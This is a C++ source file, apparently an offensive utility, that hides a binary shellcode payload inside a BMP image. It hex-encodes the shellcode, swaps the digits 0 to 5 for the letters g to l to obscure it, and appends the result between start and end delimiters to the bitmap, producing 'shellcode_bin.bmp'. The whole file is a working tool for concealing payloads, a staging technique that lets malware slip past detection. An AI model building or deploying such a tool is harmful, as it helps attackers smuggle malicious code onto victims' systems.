#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>

//encode
std::string replaceHexDigits(const std::string& hexString) {
    std::string replaced;
    for (char c : hexString) {
        //encoding just 0 to 5 
        if (c >= '0' && c <= '5') {
            replaced.push_back('g' + (c - '0'));
        }
        else {
            replaced.push_back(c);
        }
    }
    return replaced;
}

// Function for encoded paylaod insertion
std::string createDataWithDelimiter(const std::string& data) {
    std::string delimiter_start = "\n--START_HEX_DATA--\n";  // Start Delimiter
    std::string delimiter_end = "\n--END_HEX_DATA--\n";      // End Delimiter
    return delimiter_start + data + delimiter_end;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage : " << argv[0] << " <.bmp original file> <.bin binary shellcode>" << std::endl;
        return 1;
    }

    std::string ico_file = argv[1];
    std::string bin_file = argv[2];

    // open the bin file
    std::ifstream input(bin_file, std::ios::binary);
    if (!input) {
        std::cerr << "Error : can't open the input file " << bin_file << std::endl;
        return 1;
    }

    std::string output_file = "shellcode_bin.bmp";  // output file
    // 
    std::ifstream ico(ico_file, std::ios::binary);
    if (!ico) {
        std::cerr << "Error : can't open the bitmap file." << std::endl;
        return 1;
    }

    // read data stream and put in
    std::ostringstream ico_stream;
    ico_stream << ico.rdbuf();
    std::string ico_data = ico_stream.str();
    ico.close();

    std::ifstream bin(bin_file, std::ios::binary);
    if (!bin) {
        std::cerr << "Error : can't open the bin file" << std::endl;
        return 1;
    }

    std::ostringstream bin_stream;
    bin_stream << bin.rdbuf();
    std::string bin_data = bin_stream.str();
    bin.close();

    // Convert in hex
    std::ostringstream hex_stream;
    for (unsigned char c : bin_data) {
        hex_stream << std::setw(2) << std::setfill('0') << std::hex << (int)c;
    }

    std::string hex_string = hex_stream.str();

    std::string replaced_hex = replaceHexDigits(hex_string);

    // create data with delimiter
    std::string data_with_delimiters = createDataWithDelimiter(replaced_hex);

    std::ofstream output(output_file, std::ios::binary);
    if (!output) {
        std::cerr << "Error : can't open the output file" << std::endl;
        return 1;
    }

    output.write(ico_data.c_str(), ico_data.size());

    // adding the payload with delimiter at the end of the file
    output.write(data_with_delimiters.c_str(), data_with_delimiters.size());

    output.close();

    std::cout << "Bitmap was modified and save it" << output_file << std::endl;

    return 0;
}